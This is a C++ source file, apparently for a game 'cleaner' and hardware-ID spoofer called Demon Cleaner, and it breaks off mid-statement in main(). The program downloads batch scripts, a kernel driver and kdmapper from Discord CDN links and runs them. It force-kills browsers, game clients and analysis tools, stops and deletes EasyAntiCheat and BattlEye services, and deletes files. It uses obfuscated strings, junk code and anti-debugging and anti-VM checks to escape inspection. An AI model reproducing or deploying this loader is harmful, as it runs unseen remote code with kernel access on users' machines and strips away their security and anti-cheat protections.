
#include <iostream>
#include "Headers/xorstr.hpp"
#include <string>
#include <windows.h>
#include <Urlmon.h>
#include "Headers/junk-code.h"
#include <Wininet.h>
#include <stdlib.h>
#include <vector>
#include <tchar.h>
#include "Headers/color.hpp"
#include "Headers/json.hpp"
#include <fstream>
#include "Headers/value.h"
#include <stringapiset.h>
#include <TlHelp32.h>
#include "Headers/antidbg.h"
#include <cstdio>
using namespace junkcode;

#define SHOW_DEBUG_MESSAGES

int CheckTEB()
{
    int isBeingDebugged = 0;
    __asm
    {
        ; Grab the PEB at offset 30 of the fs register
        mov eax, fs: [30h]
        ; push it to the stack
        push ecx
        ; Grab the IsBeingDebugged flag out of the PED
        mov ecx, [eax + 2]
        mov isBeingDebugged, ecx
        pop ecx
    }
    return isBeingDebugged;
}
bool IsProcessRunning(const wchar_t* processName)
{
    bool exists = false;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry))
        while (Process32Next(snapshot, &entry))
            if (!_wcsicmp(entry.szExeFile, processName))
                exists = true;

    CloseHandle(snapshot);
    return exists;
}
void adbg_GetTickCount(void)
{
    BOOL found = FALSE;
    DWORD t1;
    DWORD t2;

    t1 = GetTickCount();

#ifdef _WIN64
    adbg_GetTickCountx64();
#else
    // Junk or legit code.
    _asm
    {
        xor eax, eax;
        push eax;
        push ecx;
        pop eax;
        pop ecx;
        sub ecx, eax;
        shl ecx, 4;
    }
#endif

    t2 = GetTickCount();

    // 30 milliseconds is an empirical value
    if ((t2 - t1) > 30)
    {
        found = TRUE;
    }

    if (found)
    {
        rydekem();
        lnttirs();
        tlmisir();
       

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
}
void DBG_MSG(WORD dbg_code, const char* message)
{
#ifdef SHOW_DEBUG_MESSAGES


    OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
        TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
        TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
        TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
    system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
    SetLastError(1);
    exit(0);
#endif
}
void adbg_CheckRemoteDebuggerPresent(void)
{
    HANDLE hProcess = INVALID_HANDLE_VALUE;
    BOOL found = FALSE;

    hProcess = GetCurrentProcess();
    CheckRemoteDebuggerPresent(hProcess, &found);

    if (found)
    {

        rydekem();
        lnttirs();
        tlmisir();

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
}

DWORD CalcFuncCrc(PUCHAR funcBegin, PUCHAR funcEnd)
{
    DWORD crc = 0;
    for (; funcBegin < funcEnd; ++funcBegin)
    {
        crc += *funcBegin;
    }
    return crc;
}
#pragma auto_inline(off)
VOID DebuggeeFunction()
{
    int calc = 0;
    calc += 2;
    calc <<= 8;
    calc -= 3;
}
VOID DebuggeeFunctionEnd()
{
    rydekem();
    lnttirs();
    tlmisir();

}
#pragma auto_inline(on)
DWORD g_origCrc = 0x2bd0;
void trampoline(void (*fnptr)(), bool ping = false)
{
    if (ping)
        fnptr();
    else
        trampoline(fnptr, true);
}
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"Wininet.lib") 
using namespace junkcode;
#define JUNK_CODE_ONE        \
    __asm{push eax}            \
    __asm{xor eax, eax}        \
    __asm{setpo al}            \
    __asm{push edx}            \
    __asm{xor edx, eax}        \
    __asm{sal edx, 2}        \
    __asm{xchg eax, edx}    \
    __asm{pop edx}            \
    __asm{or eax, ecx}        \
    __asm{pop eax}
void startup();
bool MemoryBreakpointDebuggerCheck()
{
    unsigned char* pMem = NULL;
    SYSTEM_INFO sysinfo = { 0 };
    DWORD OldProtect = 0;
    void* pAllocation = NULL; // Get the page size for the system 

    GetSystemInfo(&sysinfo); // Allocate memory 

    pAllocation = VirtualAlloc(NULL, sysinfo.dwPageSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (pAllocation == NULL)
        return false;

    // Write a ret to the buffer (opcode 0xc3)
    pMem = (unsigned char*)pAllocation;
    *pMem = 0xc3;

    // Make the page a guard page         
    if (VirtualProtect(pAllocation, sysinfo.dwPageSize,
        PAGE_EXECUTE_READWRITE | PAGE_GUARD,
        &OldProtect) == 0)
    {
        return false;
    }

    __try
    {
        __asm
        {
            mov eax, pAllocation
            // This is the address we'll return to if we're under a debugger
            push MemBpBeingDebugged
            jmp eax // Exception or execution, which shall it be :D?
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        // The exception occured and no debugger was detected
        VirtualFree(pAllocation, NULL, MEM_RELEASE);
        return false;
    }

    __asm {MemBpBeingDebugged:}
    VirtualFree(pAllocation, NULL, MEM_RELEASE);
    return true;
}
inline int AddSubOne(int One, int Two)
{
    JUNK_CODE_ONE
        return ((One + Two) - 1);
}

void SizeOfImage()
{
    // Any unreasonably large value will work say for example 0x100000 or 100,000h
    __asm
    {
        mov eax, fs: [0x30]				// PEB
        mov eax, [eax + 0x0c]			 // PEB_LDR_DATA
        mov eax, [eax + 0x0c]			// InOrderModuleList
        mov dword ptr[eax + 20h], 20000h // SizeOfImage    
    }
}

#define JUNK_CODE_ONE        \
    __asm{push eax}            \
    __asm{xor eax, eax}        \
    __asm{setpo al}            \
    __asm{push edx}            \
    __asm{xor edx, eax}        \
    __asm{sal edx, 2}        \
    __asm{xchg eax, edx}    \
    __asm{pop edx}            \
    __asm{or eax, ecx}        \
    __asm{pop eax}




void apex()
{
    rydekem();
    lnttirs();
    tlmisir();

    JUNK_CODE_ONE
        JUNK_CODE_ONE
        std::string apex = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114575800954941/apex.bat"));
    std::string apexpath = "C:\\Windows\\Vss\\Apex.bat";
    URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
    system("cd C:\\Windows\\Vss\\");
    system("Start C:\\Windows\\Vss\\Apex.bat");


}
void gta()
{
    rydekem();
    lnttirs();
    tlmisir();


    std::string gta = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114574483918858/gta.bat"));
    std::string gtapath = "C:\\Windows\\Vss\\gta.bat";
    URLDownloadToFileA(NULL, gta.c_str(), gtapath.c_str(), 0, NULL);
    system("cd C:\\Windows\\Vss\\");
    system("Start C:\\Windows\\Vss\\gta.bat");

}
void fortnite()
{
    rydekem();
    lnttirs();
    tlmisir();


    std::string fortnite = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114573007527946/Fortnite.bat"));
    std::string fortnitepath = "C:\\Windows\\Vss\\Fortnite.bat";
    URLDownloadToFileA(NULL, fortnite.c_str(), fortnitepath.c_str(), 0, NULL);
    system("cd C:\\Windows\\Vss\\");
    system("Start C:\\Windows\\Vss\\Fortnite.bat");
}
void fishingplanet()
{
    rydekem();
    lnttirs();
    tlmisir();

    std::string fishingplanet = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114571648593931/fishing-planet.bat"));
    std::string fishingplanetpath = "C:\\Windows\\Vss\\Fishing-planet.bat";
    URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
    system("cd C:\\Windows\Vss\\");
    system("Start C:\\Windows\\Vss\\Fishing-planet.bat");

}
void cod()
{
    rydekem();
    lnttirs();
    tlmisir();

    std::string cod = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114570369318962/Cold-Ware.bat"));
    std::string codpath = "C:\\Windows\\Vss\\Cold-Ware.bat";
    URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
    system("cd C:\\Windows\\Vss\\");
    system("Start C:\\Windows\\Vss\\Cold-Ware.bat");


}


void cleaner() {
    rydekem();
    lnttirs();
    tlmisir();

    system(XorStr("taskkill /F /IM CCleaner64.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM WargamingErrorMonitor.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM wargamingerrormonitor.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM WorldOfTanks.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM chrome.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM msedge.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM discord.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM firefox.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM brave.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM opera.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM EpicGamesLauncher.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmware-hostd.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmware-authd.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmnat.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM Spotify.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM wcg.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM UnrealCEFSubProcess.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM CEFProcess.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM CEFProcess.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM BEServices.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM BattleEye.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM epicgameslauncher.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM FortniteClient-Win64-Shipping_EAC.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM FortniteClient-Win64-Shipping.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM FortniteClient-Win64-Shipping_BE.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM FortniteLauncher.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM r5apex.exe 2>NULL").c_str());
    system(XorStr("del /F /IM C:\\Windows\\Capcom.sys 2>NULL").c_str());
    system(XorStr("del /F /IM del /f %temp%\* 2>NULL").c_str());
    system(XorStr("del /F /IM D:\\steam\\depotcache\\* 2>NULL").c_str());
    system(XorStr("del /F /IM C:\\Program Files (x86)\\EasyAntiCheat\\EasyAntiCheat.exe 2>NULL").c_str());
    system(XorStr("del /F /IM C:\\Program Files (x86)\\EasyAntiCheat\\EasyAntiCheat.sys 2>NULL").c_str());
    system(XorStr("del /F /IM C:\\Windows\\KsDumperDriver.sys 2>NULL").c_str());
    system(XorStr("del /F /IM C:\\Windows\\System32\\Capcom.sys 2>NULL").c_str());
    system(XorStr("del /F /IM C:\\Windows\\System32\KsDumperDriver.sys 2>NULL").c_str());
    system(XorStr("taskkill /F /IM openvpnserv.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM LockApp.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM vmware.exe 2>NULL").c_str());
    system(XorStr("taskkill /F /IM openvpnserv.exe 2>NULL").c_str());
    system(XorStr("taskkill /f /im KsDumperClient.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im KsDumper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im GameOverlayUI.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FolderChangesView.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im steamservice.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Lightshot.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im steamwebhelper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im PerfWatson2.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im vmware-tray.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im ProcessHacker.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im procmon.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im YourPhone.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im idaq.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im wallpaper64.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im wallpaper32.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im OneDrive.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im uTorrent.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im helper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im idaq64.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Wireshark.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Fiddler.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FiddlerEverywhere.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Xenos64.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im die.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Xenos.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Xenos32.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im de4dot.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Cheat Engine.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTP Debugger Windows Service (32 bit).exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im KsDumper.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im client.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im OllyDbg.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im x64dbg.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im x32dbg.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im EasyAntiCheat.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im BEService.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FACEIT.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im PnkBstrA.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im PnkBstrB.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Client.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteClient-Win64-Shipping.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im EpicGamesLauncher.exe >nul 2>&1").c_str());
    system(XorStr("sc stop BEService >nul 2>&1").c_str());
    system(XorStr("sc delete BEService >nul 2>&1").c_str());
    system(XorStr("sc stop BEDaisy >nul 2>&1").c_str());
    system(XorStr("sc delete BEDaisy >nul 2>&1").c_str());
    system(XorStr("sc stop EasyAntiCheat >nul 2>&1").c_str());
    system(XorStr("sc stop EasyAntiCheatSys >nul 2>&1").c_str());
    system(XorStr("sc delete EasyAntiCheat >nul 2>&1").c_str());
    system(XorStr("sc delete EasyAntiCheatSys >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im FortniteLauncher.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im RiotClientServices.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im VALORANT.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im RainbowSix.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im csgo.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im RainbowSix_BE.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
    system(XorStr("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
    system(XorStr("sc delete HTTPDebuggerPro >nul 2>&1").c_str());
    system(XorStr("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str());

}
void deleter()
{
    rydekem();
    lnttirs();
    tlmisir();


    //delete the files we downloaded
    system("cd C:\\Windows\Vss\\");
    system(XorStr("del C:\\Windows\\Vss\\woof.sys").c_str());
    system(XorStr("del C:\\Windows\\Vss\\mapper.exe").c_str());
    system(XorStr("del C:\\Windows\\Vss\\Cold-Ware.bat").c_str());
    system(XorStr("del C:\\Windows\\Vss\\Fishing-Planet.bat").c_str());
    system(XorStr("del C:\\Windows\\Vss\\Apex.bat").c_str());
    system(XorStr("del C:\\Windows\\Vss\\gta.bat").c_str());
    system(XorStr("del C:\\Windows\\Vss\\Fortnite.bat").c_str());


}

void safeshutdown()
{
    rydekem();
    lnttirs();
    tlmisir();

    system(XorStr("cls").c_str());

    string a;
    std::cout << RED << "\nunloading kernel modules";
    Sleep(3500);
    std::cout << MAGENTA << "\nunloading resources";
    Sleep(1450);
    std::cout << CYAN << "\nunloading from memory";
    Sleep(2400);
    system(XorStr("cls").c_str());
    std::cout << "Do you want to restart your pc? \nYes/No : ";
    cin >> a;
    if (GetAsyncKeyState(VK_END))
    {
        MessageBoxA(NULL, "congratualtions. you got the ( finder ) role on our discord.", "congratulations", MB_OKCANCEL);
        safeshutdown();
    }
    if (GetAsyncKeyState(VK_DELETE))
    {
        MessageBoxA(NULL, "congratualtions. you got the ( exiter ) role on our discord.", "congratulations", MB_OKCANCEL);
        safeshutdown();
    }
    if (GetAsyncKeyState(VK_INSERT))
    {
        MessageBoxA(NULL, "congratualtions. you got the ( inserter ) role on our discord.", "congratulations", MB_OKCANCEL);
        safeshutdown();
    }
    if (a == "Yes" || a == "yes")
    {
        system(XorStr("shutdown -r").c_str());
        exit(0);
    }

    else
    {
        exit(0);
        return exit(0);
    }


}
void driverdetect()
{
    rydekem();
    lnttirs();
    tlmisir();

    const TCHAR* devices[] = {
_T("\\\\.\\Dumper"),
_T("\\\\.\\KsDumper")
    };

    WORD iLength = sizeof(devices) / sizeof(devices[0]);
    for (int i = 0; i < iLength; i++)
    {
        HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        TCHAR msg[256] = _T("");
        if (hFile != INVALID_HANDLE_VALUE) {
            system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO KsDumper Detected. && TIMEOUT 10 >nul").c_str());
            SetLastError(1);
            exit(0);
        }
        else
        {

        }
    }
}

void spoofer()
{
    rydekem();
    lnttirs();
    tlmisir();





    string spoofer = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/881227464498630677/NewWoof.sys"));
    string spooferpath = "C:\\Windows\\Vss\\woof.sys";
    URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);

    string mapper = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879745681294786600/kdmapper.exe"));
    string mapperpath = "C:\\Windows\\Vss\\mapper.exe";
    URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
    system("cd C:\\Windows\\Vss\\");
    system("C:\\Windows\\Vss\\mapper.exe C:\\Windows\\Vss\\woof.sys");
    Sleep(2000);
    deleter();
    Sleep(2000);
    rydekem();
    lnttirs();
    tlmisir();
    system(XorStr("NETSH WINSOCK RESET").c_str());
    system(XorStr("NETSH INT IP RESET").c_str());
    system(XorStr("NETSH INTERFACE IPV4 RESET").c_str());
    system(XorStr("NETSH INTERFACE IPV6 RESET").c_str());
    system(XorStr("NETSH INTERFACE TCP RESET").c_str());
    system(XorStr("IPCONFIG /RELEASE").c_str());
    system(XorStr("IPCONFIG /RELEASE").c_str());
    system(XorStr("IPCONFIG /RENEW").c_str());
    system(XorStr("IPCONFIG /FLUSHDNS").c_str());
    system(XorStr("IPCONFIG /RENEW").c_str());
    system(XorStr("cls").c_str());
    safeshutdown();
}

void setcolor(unsigned short color)
{
    rydekem();
    lnttirs();
    tlmisir();
    HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hcon, color);
}
string replaceAll(string subject, const string& search,
    const string& replace) {
    size_t pos = 0;
    while ((pos = subject.find(search, pos)) != string::npos) {
        subject.replace(pos, search.length(), replace);
        pos += replace.length();
    }

    return subject;
}



vector<string> serial;

void loadserial()
{
    rydekem();
    lnttirs();
    tlmisir();


    serial.push_back(XorStr("384604182").c_str());
    serial.push_back(XorStr("2953439145").c_str());
    rydekem();
    lnttirs();
    tlmisir();

}

void mainbot()
{
    rydekem();
    lnttirs();
    tlmisir();



    TCHAR volumeName[MAX_PATH + 1] = { 0 };
    TCHAR fileSystemName[MAX_PATH + 1] = { 0 };
    DWORD serialNumber = 0;
    DWORD maxComponentLen = 0;
    DWORD fileSystemFlags = 0;



    rydekem();
    lnttirs();
    tlmisir();


    if (GetVolumeInformation(_T("C:\\"), volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)));
    while (true)
    {


        rydekem();
        lnttirs();
        tlmisir();
        if (find(serial.begin(), serial.end(), to_string(serialNumber)) != serial.end())
        {
            rydekem();
            lnttirs();
            tlmisir();

            MemoryBreakpointDebuggerCheck();


            rydekem();
            lnttirs();
            tlmisir();
            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));

            SetConsoleTitle(_T("Demon Cleaner V1.0 [release build]"));
            setcolor(12);
            std::cout << " _| |___ _____ ___ ___ \n";
            std::cout << "| . | -_|     | . |   |\n";
            std::cout << "|___|___|_|_|_|___|_|_|\n";

            std::cout << "\n";

            system(XorStr("start http://demoncleaner.gq").c_str());
            std::cout << MAGENTA << "Demon Cleaner V1.0\n";
            Sleep(2000);
            std::cout << RED << "\nloading kernel modules...\n";
            Sleep(2000);
            std::cout << CYAN << "\nloading resources...\n";
            Sleep(1000);
            std::cout << GREEN << "\nloading in memory...";
            Sleep(2400);
            system(XorStr("cls").c_str());


            cleaner();
            fishingplanet();
            gta();
            apex();
            cod();
            fortnite();
            spoofer();
            rydekem();
            lnttirs();
            tlmisir();

        }

        else
        {
            rydekem();
            lnttirs();
            tlmisir();


            system(XorStr("cls").c_str());
            std::cout << CYAN << "Sorry but you are not in our database or you are banned. " << std::endl;
            std::cout << GREEN << "serial : ";
            std::cout << serialNumber << std::endl;
            Sleep(3000);

            rydekem();
            lnttirs();
            tlmisir();
            exit(0);

        }

    }


}


typedef NTSTATUS(NTAPI* pfnNtSetInformationThread)(
    _In_ HANDLE ThreadHandle,
    _In_ ULONG  ThreadInformationClass,
    _In_ PVOID  ThreadInformation,
    _In_ ULONG  ThreadInformationLength
    );
const ULONG ThreadHideFromDebugger = 0x11;

string build_date()
{
    return __DATE__;
}

string build_time()
{
    return __TIME__;
}
void otherthing()
{
    DWORD OldProtect = 0;

    // Get base address of module
    char* pBaseAddr = (char*)GetModuleHandle(NULL);

    // Change memory protection
    VirtualProtect(pBaseAddr, 4096, // Assume x86 page size
        PAGE_READWRITE, &OldProtect);

    // Erase the header
    ZeroMemory(pBaseAddr, 4096);

    __asm
    {
        mov eax, fs: [0x30]				// PEB
        mov eax, [eax + 0x0c]			 // PEB_LDR_DATA
        mov eax, [eax + 0x0c]			// InOrderModuleList
        mov dword ptr[eax + 20h], 20000h // SizeOfImage    
    }
}
void HideFromDebugger()
{

    OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
        TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
        TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
        TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
    HMODULE hNtDll = LoadLibrary(TEXT("ntdll.dll"));
    pfnNtSetInformationThread NtSetInformationThread = (pfnNtSetInformationThread)
        GetProcAddress(hNtDll, "NtSetInformationThread");
    NTSTATUS status = NtSetInformationThread(GetCurrentThread(),
        ThreadHideFromDebugger, NULL, 0);
}
inline bool HideThread(HANDLE hThread)
{
    typedef NTSTATUS(NTAPI* pNtSetInformationThread)
        (HANDLE, UINT, PVOID, ULONG);
    NTSTATUS Status;

    // Get NtSetInformationThread
    pNtSetInformationThread NtSIT = (pNtSetInformationThread)
        GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")),
            "NtSetInformationThread");

    // Shouldn't fail
    if (NtSIT == NULL)
        return false;

    // Set the thread info
    if (hThread == NULL)
        Status = NtSIT(GetCurrentThread(),
            0x11, // HideThreadFromDebugger
            0, 0);
    else
        Status = NtSIT(hThread, 0x11, 0, 0);

    if (Status != 0x00000000)
        return false;
    else
        return true;
}
void startup();
int _start()
{


    HideThread;
    startup();
    return 0;


}
void startup()
{



    LPCWSTR windowName = L"x32dbg";
    LPCWSTR vmname = L"VMware Workstation";






    if (CheckTEB())
    {
        trampoline;


        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsDebuggerPresent())
    {
        trampoline;


        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }

    if (FindWindow(NULL, windowName))
    {
        trampoline;


        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO x32dbg Detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);

    }

    if (FindWindow(NULL, vmname))
    {
        trampoline;


        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO VMware Workstation Detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);

    }







    if (GetLastError == 0)
    {

        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE
        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        HideFromDebugger();
        driverdetect();
        build_date();
        build_time();
        loadserial();
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE
        mainbot();

    }



}

int main()
{
    if (IsProcessRunning(L"ida.exe"))
    {
        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
        system(XorStr("start cmd /c START CMD /C \"COLOR 6 && TITLE IDA detected && ECHO IDA Decompiler detected. && TIMEOUT 10 >nul").c_str());
        SetLastError(1);
        exit(0);
    }
    if (IsProcessRunning(L"ProcessHacker.exe"))
    {
        trampoline;
        rydekem();
        lnttirs();
        tlmisir();
        JUNK_CODE_ONE
            JUNK_CODE_ONE
            JUNK_CODE_ONE

        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
